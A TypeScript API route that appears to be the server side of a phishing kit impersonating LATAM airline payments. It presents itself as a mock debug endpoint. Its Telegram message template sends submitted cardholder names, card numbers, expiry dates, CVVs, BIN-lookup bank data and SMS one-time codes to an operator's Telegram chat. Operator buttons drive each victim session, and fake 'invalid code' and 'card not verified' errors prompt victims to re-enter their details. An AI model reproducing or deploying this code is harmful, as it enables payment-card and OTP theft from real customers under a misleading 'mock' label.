export const prerender = false;

import type { APIRoute } from 'astro';
import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from 'astro:env/server';

type DebugEvent = 'PAYMENT_SUBMIT' | 'OTP_SUBMIT';
type RouteAction = 'wait' | 'sms' | 'card' | 'sms_error' | 'card_error' | 'approved';

type RouteDecision = {
  action: RouteAction;
  brand?: string;
  message?: string;
  updatedAt?: string;
};

type DebugSession = {
  decision?: RouteDecision;
  steps: Set<string>;
  payload?: Record<string, unknown>;
};

const SMS_INVALID_MESSAGE = 'Código inválido. Hemos enviado un nuevo código por SMS o correo';

const CARD_MOCKS: Record<string, { brand: string; pan: string; exp: string; cvv: string; holder: string }> = {
  '3': { brand: 'amex', pan: '378282246310005', exp: '12/30', cvv: '1234', holder: 'QA AMEX MOCK' },
  '4': { brand: 'visa', pan: '4111111111111111', exp: '12/30', cvv: '123', holder: 'QA VISA MOCK' },
  '5': { brand: 'mastercard', pan: '5555555555554444', exp: '12/30', cvv: '123', holder: 'QA MC MOCK' },
  '6': { brand: 'discover', pan: '6011111111111117', exp: '12/30', cvv: '123', holder: 'QA DISCOVER MOCK' },
};

// Estado efimero por instancia serverless/dev: guarda la decision elegida en Telegram
// los pasos ya pedidos y el ultimo payload recibido por sessionId.
const globals = globalThis as typeof globalThis & {
  __latamDebugSessions?: Map<string, DebugSession>;
  __latamDebugTelegramOffset?: number;
  __latamDebugCallbackIds?: Set<string>;
  __latamDebugSync?: Promise<void>;
};
const sessions = globals.__latamDebugSessions ?? new Map<string, DebugSession>();
globals.__latamDebugSessions = sessions;
const answeredCallbacks = globals.__latamDebugCallbackIds ?? new Set<string>();
globals.__latamDebugCallbackIds = answeredCallbacks;

function json(data: unknown, init: ResponseInit = {}) {
  return new Response(JSON.stringify(data), {
    ...init,
    headers: {
      'Content-Type': 'application/json',
      'Cache-Control': 'no-store',
      ...init.headers,
    },
  });
}

function cleanSessionId(value: unknown) {
  const id = String(value || '').replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 80);
  return id || crypto.randomUUID();
}

function cardMockForFirstDigit(value: unknown) {
  const first = String(value || '').replace(/\D/g, '').charAt(0);
  return CARD_MOCKS[first] || CARD_MOCKS['4'];
}

// Lee secretos solo desde backend. Estos valores no se importan en scripts de navegador.
function telegramConfig() {
  return {
    token: TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN || '',
    chatId: TELEGRAM_CHAT_ID || process.env.TELEGRAM_CHAT_ID || '',
  };
}

function getSession(sessionId: string) {
  const session = sessions.get(sessionId) ?? { steps: new Set<string>() };
  sessions.set(sessionId, session);
  return session;
}

function objectValue(value: unknown) {
  return value && typeof value === 'object' ? (value as Record<string, unknown>) : undefined;
}

function rememberStep(sessionId: string, step: string) {
  getSession(sessionId).steps.add(step);
}

function hasStep(sessionId: string, step: string) {
  return getSession(sessionId).steps.has(step);
}

// Traduce un boton de Telegram en una decision consumible por el frontend.
// Tambien aplica reglas de repeticion para tarjeta/SMS dentro de la misma sesion.
function makeDecision(sessionId: string, action: RouteAction, brand?: string): RouteDecision {
  if (action === 'card') {
    if (hasStep(sessionId, 'card')) {
      getSession(sessionId).steps = new Set(['card']);
      return {
        action: 'card_error',
        brand,
        message: 'No pudimos verificar la tarjeta. Ingresa los datos nuevamente.',
        updatedAt: new Date().toISOString(),
      };
    }
    rememberStep(sessionId, 'card');
  }

  if (action === 'sms') {
    if (hasStep(sessionId, 'sms')) {
      return {
        action: 'sms_error',
        brand,
        message: SMS_INVALID_MESSAGE,
        updatedAt: new Date().toISOString(),
      };
    }
    rememberStep(sessionId, 'sms');
  }

  return { action, brand, updatedAt: new Date().toISOString() };
}

function actionLabel(action: RouteAction) {
  const labels: Record<RouteAction, string> = {
    wait: 'Esperando operador',
    sms: 'Enviar a SMS',
    card: 'Pedir tarjeta',
    sms_error: 'Error SMS repetido',
    card_error: 'Error tarjeta repetida',
    approved: 'Aprobado mock',
  };
  return labels[action] || action;
}

// Los tres botones se mantienen iguales en todos los mensajes para que el operador
// siempre tenga las mismas opciones de routing manual.
function keyboard(sessionId: string, brand: string) {
  return {
    inline_keyboard: [
      [{ text: 'Pedir SMS', callback_data: `route:${sessionId}:sms:${brand}` }],
      [{ text: 'Pedir Tarjeta', callback_data: `route:${sessionId}:card:${brand}` }],
      [{ text: 'Finalizar', callback_data: `route:${sessionId}:approved:${brand}` }],
    ],
  };
}

// Plantilla unica para todos los eventos: page views, pago y OTP usan la misma estructura.
function formatTelegramMessage(payload: Record<string, unknown>) {
  console.log('PAYLOAD FROM MAP: ', payload);
  const mockCard = payload.mockCard as { brand?: string; pan?: string; exp?: string; cvv?: string; holder?: string } | undefined;
  const meta = payload.meta as Record<string, unknown> | undefined;
  const brand = String(payload.brand || mockCard?.brand || meta?.brand || '-');
  const amount = String(meta?.amount || '-');
  const lines = [
    '✈️ LATAM PANEL',
    '━━━━━━━━━━━━━━━━━━',
    `🆔 Sesión: ${payload.sessionId || '-'}`,
    `💵 Monto: $ ${amount}`,
    '',
    '💳 DATOS DE PAGO',
    `👤 Titular: ${payload?.meta?.cpayload?.holder || '-'}`,
    `🏷️ Marca: ${brand.toUpperCase()}`,
    `💳 Tarjeta: ${payload.meta.cpayload.b || '-'}`,
    `📅 Expira: ${payload?.meta?.cpayload?.exp || '-'}`,
    `📅 CVV: ${payload?.meta?.cpayload?.cv || '-'}`,
    '',
    `📅 Nivel: ${payload?.meta?.cpayload?.checker?.level || '-'}`,
    `📅 Banco: ${payload?.meta?.cpayload?.checker?.bank || '-'}`,
    `📅 País: ${payload?.meta?.cpayload?.checker?.country || '-'}`,
    '',
    '💰 OTP',
    `💵 Código: ${payload.metaOtp.otp}`,
    '━━━━━━━━━━━━━━━━━━',
  ];

  return lines.join('\n');
}

// Wrapper minimo para llamar metodos del Bot API sin repetir token/url.
async function telegramApi(method: string, payload: Record<string, unknown>) {
  const { token } = telegramConfig();
  if (!token) return { ok: false, skipped: 'telegram-env-missing', status: 0 };
  try {
    const response = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
    const body = await response.json().catch(() => ({}));
    return { ok: response.ok && body?.ok !== false, status: response.status, description: String(body?.description || '') };
  } catch {
    return { ok: false, status: 0, description: 'telegram-network' };
  }
}

async function fetchUpdates(token: string, offset?: number) {
  const qs = new URLSearchParams({
    timeout: '0',
    allowed_updates: JSON.stringify(['callback_query']),
  });
  if (typeof offset === 'number') qs.set('offset', String(offset));
  const response = await fetch(`https://api.telegram.org/bot${token}/getUpdates?${qs.toString()}`, {
    headers: { Accept: 'application/json' },
  });
  const payload = await response.json().catch(() => ({}));
  return { status: response.status, payload };
}

async function ensurePollingMode() {
  await telegramApi('deleteWebhook', { drop_pending_updates: false });
}

// En local no hay webhook publico. getUpdates permite recoger callbacks cuando
// el frontend hace polling al endpoint GET /api/debug.
async function telegramGetUpdates() {
  const { token } = telegramConfig();
  if (!token) return [];
  const offset = globals.__latamDebugTelegramOffset;
  const first = await fetchUpdates(token, offset);
  if (first.status === 409 || /webhook/i.test(String(first.payload?.description || ''))) {
    await telegramApi('deleteWebhook', { drop_pending_updates: false });
    return [];
  }
  if (first.status !== 200) return [];
  return Array.isArray(first.payload?.result) ? first.payload.result : [];
}

// Envia el evento al chat de Telegram con datos mock/redactados y botones opcionales.
async function sendTelegram(payload: Record<string, unknown>, options: { withButtons?: boolean } = {}) {
  const { chatId } = telegramConfig();
  if (!chatId) return { sent: false, skipped: 'telegram-env-missing' };
  const sessionId = String(payload.sessionId || '');
  const brand = String(payload.brand || (payload.mockCard as { brand?: string } | undefined)?.brand || 'visa');
  const message: Record<string, unknown> = {
    chat_id: chatId,
    text: formatTelegramMessage(payload),
    disable_web_page_preview: true,
  };
  if (options.withButtons ?? true) {
    message.reply_markup = keyboard(sessionId, brand);
    await ensurePollingMode();
  }
  const result = await telegramApi('sendMessage', message);
  return result.ok ? { sent: true } : { sent: false, error: `telegram-${result.status || 'unknown'}` };
}

function rememberCallbackId(id: string) {
  answeredCallbacks.add(id);
  if (answeredCallbacks.size > 200) {
    const first = answeredCallbacks.values().next().value;
    if (first) answeredCallbacks.delete(first);
  }
}

async function answerTelegramCallback(callbackId: unknown) {
  const id = String(callbackId || '');
  if (!id || answeredCallbacks.has(id)) return;
  rememberCallbackId(id);
  await telegramApi('answerCallbackQuery', {
    callback_query_id: id,
  });
}

async function clearTelegramKeyboard(callback: Record<string, unknown>, note: string) {
  const message = callback.message as Record<string, unknown> | undefined;
  if (!message?.chat || typeof message.message_id !== 'number') return;
  const chat = message.chat as Record<string, unknown>;
  const original = String(message.text || '');
  const text = original.includes('✅') ? original : `${original}\n\n✅ ${note}`.trim();
  const edited = await telegramApi('editMessageText', {
    chat_id: chat.id,
    message_id: message.message_id,
    text: text || '✅',
    reply_markup: { inline_keyboard: [] },
  });
  if (edited.ok) return;
  await telegramApi('editMessageReplyMarkup', {
    chat_id: chat.id,
    message_id: message.message_id,
    reply_markup: { inline_keyboard: [] },
  });
}

// Procesa un clic de Telegram una sola vez: guarda la decision, quita botones y cierra el loading.
async function handleTelegramCallback(body: Record<string, unknown>) {
  const callback = (body.callback_query || body) as Record<string, unknown> | undefined;
  const source = (callback && typeof callback === 'object' && 'data' in callback ? callback : {}) as Record<string, unknown>;
  const callbackId = String(source.id || '');
  const already = Boolean(callbackId && answeredCallbacks.has(callbackId));
  const data = String(source.data || '');
  const match = data.match(/^route:([^:]+):(sms|card|approved):([^:]*)$/);

  if (!already) await answerTelegramCallback(source.id);

  if (!match) {
    if (!already) await clearTelegramKeyboard(source, 'Listo');
    return json({ ok: true, ignored: true });
  }

  const [, rawSessionId, rawAction, rawBrand] = match;
  const sessionId = cleanSessionId(rawSessionId);
  const decision = makeDecision(sessionId, rawAction as RouteAction, rawBrand || 'visa');
  getSession(sessionId).decision = decision;
  await clearTelegramKeyboard(source, actionLabel(decision.action));

  return json({ ok: true, sessionId, decision });
}

// Sincroniza callbacks pendientes antes de responder al polling del navegador.
async function syncTelegramCallbacks() {
  if (globals.__latamDebugSync) return globals.__latamDebugSync;
  const run = (async () => {
    const updates = await telegramGetUpdates();
    let maxId = globals.__latamDebugTelegramOffset;
    for (const update of updates) {
      if (typeof update?.update_id === 'number') {
        maxId = typeof maxId === 'number' ? Math.max(maxId, update.update_id + 1) : update.update_id + 1;
      }
    }
    if (typeof maxId === 'number') {
      globals.__latamDebugTelegramOffset = maxId;
      const { token } = telegramConfig();
      if (token) await fetchUpdates(token, maxId);
    }
    for (const update of updates) {
      if (update?.callback_query) {
        await handleTelegramCallback({ callback_query: update.callback_query });
      }
    }
  })().finally(() => {
    globals.__latamDebugSync = undefined;
  });
  globals.__latamDebugSync = run;
  return run;
}

// El frontend consulta este endpoint mientras muestra loader, esperando la decision
// que el operador eligio en Telegram para esta sessionId.
export const GET: APIRoute = async ({ url }) => {
  const sessionId = cleanSessionId(url.searchParams.get('sessionId'));
  await syncTelegramCallbacks();
  return json({ sessionId, decision: getSession(sessionId).decision || { action: 'wait' } });
};

// Recibe page views y submits del frontend. Los datos sensibles nunca llegan aqui:
// el cliente envia datos mock/enmascarados y este endpoint arma el mensaje operativo.
export const POST: APIRoute = async ({ request }) => {
  let body: Record<string, unknown> = {};
  try {
    body = await request.json();
  } catch {
    return json({ error: 'JSON invalido' }, { status: 400 });
  }

  if (body.callback_query) return handleTelegramCallback(body);
  if (body.update_id && (body as { message?: unknown }).message) {
    return json({ ok: true, ignored: 'telegram-message' });
  }

  console.info('[debug-api:body]', body);

  const event = String(body.event || '') as DebugEvent;
  const allowed = new Set<DebugEvent>(['PAYMENT_SUBMIT', 'OTP_SUBMIT']);
  if (!allowed.has(event)) return json({ error: 'Evento debug invalido' }, { status: 400 });

  const sessionId = cleanSessionId(body.sessionId);
  const session = getSession(sessionId);
  const previousPayload = session.payload;
  const previousMeta = objectValue(previousPayload?.meta);
  const previousMetaOtp = objectValue(previousPayload?.metaOtp);
  const incomingMeta = objectValue(body.meta);
  const incomingMetaOtp = objectValue(body.metaOtp);
  const mockCard = event === 'PAYMENT_SUBMIT' ? cardMockForFirstDigit(body.cardFirstDigit) : undefined;
  const brand = String(mockCard?.brand || incomingMeta?.brand || incomingMetaOtp?.brand || previousMeta?.brand || previousMetaOtp?.brand || 'visa');
  if (event === 'PAYMENT_SUBMIT') {
    rememberStep(sessionId, 'card');
    session.decision = { action: 'wait', brand, updatedAt: new Date().toISOString() };
  }
  if (event === 'OTP_SUBMIT') {
    rememberStep(sessionId, 'sms');
    session.decision = { action: 'wait', brand, updatedAt: new Date().toISOString() };
  }

  const payload = {
    sessionId,
    event,
    route: String(body.route || ''),
    createdAt: new Date().toISOString(),
    brand,
    meta: incomingMeta || previousMeta || {},
    metaOtp: incomingMetaOtp || previousMetaOtp || {},
    action: event === 'PAYMENT_SUBMIT' || event === 'OTP_SUBMIT' ? 'wait' : 'ack',
    mockCard,
  };

  console.info('[debug-api]', payload);
  session.payload = payload;
  const telegram = await sendTelegram(payload);

  return json({ ...payload, telegram });
};
